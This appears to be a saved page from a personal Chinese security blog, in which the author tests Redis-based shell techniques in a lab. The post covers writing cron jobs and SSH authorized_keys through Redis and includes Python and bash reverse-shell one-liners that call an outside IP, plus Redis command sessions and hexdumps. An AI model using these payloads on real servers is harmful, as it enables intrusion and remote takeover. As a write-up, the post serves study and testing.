@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+
+<html lang="zh-Hans">
+<head>
+<!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+<meta charset="utf-8"/>
+<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<meta content="telephone=no" name="format-detection">
+<meta content="LoRexxar" name="author"/>
+<meta content="之前在出AT Field的时候，在通过redis弹shell的过程中遇到一些问题，今天专门测试一下，解决一些疑惑" name="description"/>
+<meta content="article" property="og:type"/>
+<meta content="通过redis getshell的一些小问题" property="og:title"/>
+<meta content="http://lorexxar.cn/2016/12/03/redis-getshell/index.html" property="og:url"/>
+<meta content="LoRexxar's Blog" property="og:site_name"/>
+<meta content="之前在出AT Field的时候，在通过redis弹shell的过程中遇到一些问题，今天专门测试一下，解决一些疑惑" property="og:description"/>
+<meta content="2016-12-05T13:13:22.000Z" property="og:updated_time"/>
+<meta content="summary" name="twitter:card"/>
+<meta content="通过redis getshell的一些小问题" name="twitter:title"/>
+<meta content="之前在出AT Field的时候，在通过redis弹shell的过程中遇到一些问题，今天专门测试一下，解决一些疑惑" name="twitter:description"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
+<script src="./通过redis getshell的一些小问题  LoRexxar's Blog/pace.min.js"></script>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/style.css" rel="stylesheet"/>
+<link href="./通过redis getshell的一些小问题  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
+<title>通过redis getshell的一些小问题 | LoRexxar's Blog</title>
+<script src="./通过redis getshell的一些小问题  LoRexxar's Blog/jquery.min.js"></script>
+<script src="./通过redis getshell的一些小问题  LoRexxar's Blog/clipboard.min.js"></script>
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+<script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+<script> yiliaConfig.rootUrl = "\/";</script>
+<script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+</meta></meta></head>
+<body>
+<div id="container">
+<div class="left-col">
+<div class="overlay"></div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./通过redis getshell的一些小问题  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<form id="search-form">
+<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
+<i class="fa fa-times" onclick="resetSearch()"></i>
+</form>
+<div id="local-search-result"></div>
+<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
+<div class="switch-btn" id="switch-btn">
+<div class="icon">
+<div class="icon-ctn">
+<div class="icon-wrap icon-house" data-idx="0">
+<div class="birdhouse"></div>
+<div class="birdhouse_holes"></div>
+</div>
+<div class="icon-wrap icon-ribbon hide" data-idx="1">
+<div class="ribbon"></div>
+</div>
+<div class="icon-wrap icon-link hide" data-idx="2">
+<div class="loopback_l"></div>
+<div class="loopback_r"></div>
+</div>
+<div class="icon-wrap icon-me hide" data-idx="3">
+<div class="user"></div>
+<div class="shoulder"></div>
+</div>
+</div>
+</div>
+<div class="tips-box hide">
+<div class="tips-arrow"></div>
+<ul class="tips-inner">
+<li>菜单</li>
+<li>标签</li>
+<li>友情链接</li>
+<li>关于我</li>
+</ul>
+</div>
+</div>
+<div class="switch-area" id="switch-area">
+<div class="switch-wrap">
+<section class="switch-part switch-part1">
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
+</ul>
+</nav>
+</section>
+<section class="switch-part switch-part2">
+<div class="widget tagcloud" id="js-tagcloud">
+<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
+</div>
+</section>
+<section class="switch-part switch-part3">
+<div id="js-friends">
+<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
+<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
+<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
+<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
+<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
+<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
+<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
+<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
+<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
+<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
+<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
+<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
+<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
+<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
+<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
+</div>
+</section>
+<section class="switch-part switch-part4">
+<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
+</section>
+</div>
+</div>
+</header>
+</div>
+</div>
+<div class="mid-col">
+<nav id="mobile-nav">
+<div class="overlay">
+<div class="slider-trigger"></div>
+<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
+</div>
+<div class="intrude-less">
+<header class="inner" id="header">
+<a class="profilepic" href="/">
+<img class="animated zoomIn" src="./通过redis getshell的一些小问题  LoRexxar's Blog/699-14040QPP9.jpg"/>
+</a>
+<hgroup>
+<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
+</hgroup>
+<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
+<nav class="header-menu">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="/archives/">所有文章</a></li>
+<li><a href="/tags/">标签云</a></li>
+<li><a href="/about/">关于我</a></li>
+<div class="clearfix"></div>
+</ul>
+</nav>
+<nav class="header-nav">
+<ul class="social">
+<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
+<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
+<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
+<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
+<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
+</ul>
+</nav>
+</header>
+</div>
+<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
+</link></nav>
+<div class="body-wrap"><article class="article article-type-post" id="post-redis-getshell" itemprop="blogPost" itemscope="">
+<div class="article-meta">
+<a class="article-date" href="/2016/12/03/redis-getshell/">
+<time datetime="2016-12-03T08:08:53.000Z" itemprop="datePublished">2016-12-03</time>
+</a>
+</div>
+<div class="article-inner">
+<input class="isFancy" type="hidden"/>
+<header class="article-header">
+<h1 class="article-title" itemprop="name">
+      通过redis getshell的一些小问题
+    </h1>
+</header>
+<div class="article-info article-info-post">
+<div class="article-category tagcloud">
+<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
+</div>
+<div class="article-tag tagcloud">
+<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crontab/">crontab</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/">redis</a></li></ul>
+</div>
+<div class="clearfix"></div>
+</div>
+<div class="article-entry" itemprop="articleBody">
+<p>之前在出AT Field的时候，在通过redis弹shell的过程中遇到一些问题，今天专门测试一下，解决一些疑惑</p>
+<a id="more"></a>
+<p>这里我们不考虑如何写入redis中，只考虑从redis到服务器这个过程</p>
+<p>使用两种反弹shell的方式，第一种是python弹的</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"xxx"</span>,<span class="number">6666</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);'</div></pre></td></tr></table></figure>
+<p>第二种是直接弹的</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/<span class="number">1</span> * * * * <span class="meta-keyword">/bin/</span>bash -i &gt;&amp; <span class="meta-keyword">/dev/</span>tcp<span class="meta-keyword">/xxxx/</span><span class="number">12345</span> <span class="number">0</span>&gt;<span class="variable">&amp;1</span></div></pre></td></tr></table></figure>
+<p>首先要明确第一点，用写入crontab的方式要求redis必须是root用户启动，我们可以看看2个配置文件的权限</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@fe8fb94b7fb1:</span>/var/spool/cron/crontabs# ll</div><div class="line">total <span class="number">12</span></div><div class="line">drwx-wx--T <span class="number">2</span> root crontab <span class="number">4096</span> Dec  <span class="number">3</span> <span class="number">08</span>:<span class="number">17</span> ./</div><div class="line">drwxr-xr-x <span class="number">3</span> root root    <span class="number">4096</span> Dec  <span class="number">2</span> <span class="number">17</span>:<span class="number">27</span> ../</div><div class="line">-rw------- <span class="number">1</span> root crontab <span class="number">1341</span> Dec  <span class="number">3</span> <span class="number">06</span>:<span class="number">47</span> root</div><div class="line"></div><div class="line"></div><div class="line">root<span class="variable">@fe8fb94b7fb1</span>:/etc# ll crontab </div><div class="line">-rw-r--r-- <span class="number">1</span> root root <span class="number">722</span> Apr  <span class="number">5</span>  <span class="number">2016</span> crontab</div></pre></td></tr></table></figure>
+<p>很明显如果redis是以redis用户运行的话，在save的时候会报error</p>
+<h1 id="ubuntu系统"><a class="headerlink" href="#ubuntu系统" title="ubuntu系统"></a>ubuntu系统</h1><h2 id="crontab方式"><a class="headerlink" href="#crontab方式" title="crontab方式"></a>crontab方式</h2><p>在debian系统下，首先我们得知道配置文件的位置<br/>1、/etc/crontab<br/>2、/var/spool/cron/crontab/   单个用户的crontab配置</p>
+<p>我们先设置好键值<br/>并写入payload1</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">127.0.0.1:6379&gt; config <span class="keyword">set</span> <span class="keyword">dir</span> /<span class="keyword">var</span>/spool/cron/crontab</div><div class="line">(<span class="keyword">error</span>) <span class="keyword">ERR</span> Changing directory: <span class="keyword">No</span> such <span class="keyword">file</span> or directory</div><div class="line">127.0.0.1:6379&gt; config <span class="keyword">set</span> <span class="keyword">dir</span> /<span class="keyword">var</span>/spool/cron/crontabs</div><div class="line">OK</div><div class="line">127.0.0.1:6379&gt; config <span class="keyword">set</span> dbfilename root</div><div class="line">OK</div><div class="line">127.0.0.1:6379&gt; get 1</div><div class="line"><span class="string">"* * * * * /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"</span>115.28.78.16\<span class="string">",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"</span>/bin/<span class="keyword">sh</span>\<span class="string">",\"</span>-i\<span class="string">"]);'"</span></div><div class="line">127.0.0.1:6379&gt; <span class="keyword">save</span></div><div class="line">OK</div></pre></td></tr></table></figure>
+<p>在迷一样的地方截断了<br/><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@fe8fb94b7fb1:/var/spool/cron/crontabs# xxd root </div><div class="line"><span class="number">00000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">36</span>fe <span class="number">0000</span> c001 c340  REDIS0006......@</div><div class="line"><span class="number">00000010</span>: c440 fb02 <span class="number">2</span>a20 <span class="number">2</span>aa0 <span class="number">011</span>f <span class="number">2f75 7372</span> <span class="number">2</span>f62  .@..* *.../usr/b</div><div class="line"><span class="number">00000020</span>: <span class="number">696</span>e <span class="number">2f70 7974</span> <span class="number">686</span>f <span class="number">6e20 2d63</span> <span class="number">2027</span> <span class="number">696d</span>  in/python -c 'im</div><div class="line"><span class="number">00000030</span>: <span class="number">706</span>f <span class="number">7274 2073</span> <span class="number">6f63 6b65</span> <span class="number">1574 2c73</span> <span class="number">7562</span>  port socke.t,sub</div><div class="line"><span class="number">00000040</span>: <span class="number">7072 6f63</span> <span class="number">6573</span> <span class="number">732</span>c <span class="number">6f73 2c73</span> <span class="number">7973 3b73</span>  process,os,sys<span class="comment">;s</span></div><div class="line"><span class="number">00000050</span>: <span class="number">3d80 1a00</span> <span class="number">2e80 0600</span> <span class="number">2880 0608</span> <span class="number">2</span>e41 <span class="number">465</span>f  =.......(....AF_</div><div class="line"><span class="number">00000060</span>: <span class="number">494</span>e <span class="number">4554</span> <span class="number">2</span>ca0 <span class="number">0</span>e1f <span class="number">534</span>f <span class="number">434</span>b <span class="number">5f53 5452</span>  INET,...SOCK_STR</div><div class="line"><span class="number">00000070</span>: <span class="number">4541 4d29</span> <span class="number">3b73 2e63</span> <span class="number">6</span>f6e <span class="number">6e65 6374</span> <span class="number">2828</span>  EAM)<span class="comment">;s.connect((</span></div><div class="line"><span class="number">00000080</span>: <span class="number">2231 3135</span> <span class="number">2</span>e32 <span class="number">382</span>e <span class="number">0737</span> <span class="number">382</span>e <span class="number">3136</span> <span class="number">222</span>c  "<span class="number">115</span>.<span class="number">28</span>..<span class="number">78</span>.<span class="number">16</span>",</div><div class="line"><span class="number">00000090</span>: <span class="number">3620 0019</span> <span class="number">2929</span> <span class="number">3</span>b6f <span class="number">732</span>e <span class="number">6475 7032</span> <span class="number">2873</span>  <span class="number">6</span> ..))<span class="comment">;os.dup2(s</span></div><div class="line"><span class="number">000000a0</span>: <span class="number">2</span>e66 <span class="number">696</span>c <span class="number">656</span>e <span class="number">6</span>f28 <span class="number">292</span>c <span class="number">3029 3b20</span> e00a  .fileno(),<span class="number">0</span>)<span class="comment">; ..</span></div><div class="line"><span class="number">000000b0</span>: <span class="number">1600 31e0</span> <span class="number">0d16 0432</span> <span class="number">293</span>b <span class="number">703d</span> e001 ab07  ..<span class="number">1</span>....<span class="number">2</span>)<span class="comment">;p=....</span></div><div class="line"><span class="number">000000c0</span>: <span class="number">2</span>e63 <span class="number">616</span>c <span class="number">6c28 5b22</span> <span class="number">60d</span>b <span class="number">0b73 6822</span> <span class="number">2</span>c22  .call(["`..sh","</div><div class="line"><span class="number">000000d0</span>: <span class="number">2d</span>69 <span class="number">225d</span> <span class="number">293</span>b <span class="number">27</span>ff <span class="number">8</span>c5e <span class="number">76</span>ca <span class="number">1e73 7b64</span>  -i"])<span class="comment">;'..^v..s{d</span></div></pre></td></tr></table></figure></p>
+<p>好像很顺利<br/><figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@fe8fb94b7fb1:/var/spool/cron/crontabs# xxd root </div><div class="line"><span class="number">00000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">36</span>fe <span class="number">0000</span> c001 <span class="number">3</span>e0a  REDIS0006.....&gt;.</div><div class="line"><span class="number">00000010</span>: <span class="number">2</span>a2f <span class="number">3120 2a20</span> <span class="number">2a20 2a20</span> <span class="number">2a20 2f62</span> <span class="number">696</span>e  */<span class="number">1</span> * * * * /bin</div><div class="line"><span class="number">00000020</span>: <span class="number">2f62 6173</span> <span class="number">6820 2d69</span> <span class="number">203</span>e <span class="number">2620 2f64</span> <span class="number">6576</span>  /bash -i &gt;&amp; /dev</div><div class="line"><span class="number">00000030</span>: <span class="number">2f74 6370</span> <span class="number">2f31 3135</span> <span class="number">2</span>e32 <span class="number">382</span>e <span class="number">3738 2e31</span>  /tcp/<span class="number">115.28.78.1</span></div><div class="line"><span class="number">00000040</span>: <span class="number">362</span>f <span class="number">3132 3334</span> <span class="number">3520</span> <span class="number">303</span>e <span class="number">2631</span> <span class="number">0</span>aff <span class="number">67</span>eb  <span class="number">6/12345 0</span>&gt;&amp;<span class="number">1</span>..g.</div><div class="line"><span class="number">00000050</span>: <span class="number">2</span>a29 <span class="number">4</span>e8b <span class="number">2216</span>                           *)N.".</div></pre></td></tr></table></figure></p>
+<p>但是完全等不到shell</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root<span class="variable">@iZ285ei82c1Z:</span>~# nc -l -p <span class="number">12345</span></div></pre></td></tr></table></figure>
+<p>我们尝试写入到<strong>/etc/crontab</strong></p>
+<p>这里有一点儿区别的是，在这里需要指明用户，也就是</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*/<span class="number">1</span> * * * * root /usr/bin/python -c 'import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">"115.28.78.16"</span>,<span class="number">6666</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>]);'</div></pre></td></tr></table></figure>
+<p>python同样会发生神秘的截断，直接弹shell也是失败的，这里我们发现了一个问题，在redis中我们通过写入文件的形式，会在文件的开头和结尾写入部分格式头尾，这样crontab如果对格式要求严格，那么就不能成功执行crontab中的命令。</p>
+<h2 id="通过写入authorized-keys-getshell"><a class="headerlink" href="#通过写入authorized-keys-getshell" title="通过写入authorized_keys getshell"></a>通过写入authorized_keys getshell</h2><p>crontab尝试失败了，那么还有一种利用比较多的方式是通过写authorized_keys来get shell</p>
+<p>这里我们修改了目录到/root/.ssh，然后写入公钥</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">127.0.0.1:6379&gt;</span> config set dir /root/.ssh</div><div class="line">OK</div><div class="line"><span class="meta">127.0.0.1:6379&gt;</span> config set dbfilename authorized_keys</div><div class="line">OK</div><div class="line"><span class="meta">127.0.0.1:6379&gt;</span> set <span class="number">1</span> <span class="string">"\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsJ4pbjXL5KnnX/FP6sZORaT3N8/A6SEYv23VfrIVoPdOCBVD98O+RExVWCe8Iknwzx3w1Hm2uWnB6i6AtCnIji3yz16HIPryzoLE65xN4Z2vGXZk2YmOuRtqFPKPk/QCdf1Vxh6lwLZRo2msYEK/+mziOrmYy1UzwqLxfl1uNYVYTs2jHGBEikPwA7FAt5ZVRRBhzDnn8dyT201FOwR/fpukiXbaevZU2/iyW+Qu9ssaZMJMpRzautNuZLxCmV9TfuP0NbsgCBHj1nOMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n"</span></div><div class="line">OK</div><div class="line"><span class="meta">127.0.0.1:6379&gt;</span> save</div></pre></td></tr></table></figure>
+<p>看看十六进制</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">root@fe8fb94b7fb1:~/.ssh# xxd authorized_keys </div><div class="line"><span class="number">00000000</span>: <span class="number">5245 4449</span> <span class="number">5330 3030</span> <span class="number">36</span>fe <span class="number">0000</span> c<span class="number">001 4180</span>  REDIS0006.....<span class="keyword">A</span>.</div><div class="line"><span class="number">00000010</span>: <span class="number">0</span>a0a <span class="number">7373</span> <span class="number">682d</span> <span class="number">7273 6120</span> <span class="number">4141 4141</span> <span class="number">4233</span>  ..ssh-rsa AAAAB3</div><div class="line"><span class="number">00000020</span>: <span class="number">4</span>e7a <span class="number">6143 3179</span> <span class="number">6332 4541</span> <span class="number">4141 4142</span> <span class="number">4977</span>  NzaC1yc2EAAAABIw</div><div class="line"><span class="number">00000030</span>: <span class="number">4141 4151</span> <span class="number">4541</span> <span class="number">734</span>a <span class="number">3470</span> <span class="number">626</span>a <span class="number">584</span>c <span class="number">354</span>b  AAAQEAsJ4pbjXL5K</div><div class="line"><span class="number">00000040</span>: <span class="number">6</span>e6e <span class="number">582</span>f <span class="number">4650 3673</span> <span class="number">5</span>a4f <span class="number">5261 5433</span> <span class="number">4</span>e38  nnX/FP6sZORaT3N8</div><div class="line"><span class="number">00000050</span>: <span class="number">2f41 3653</span> <span class="number">4559 7632</span> 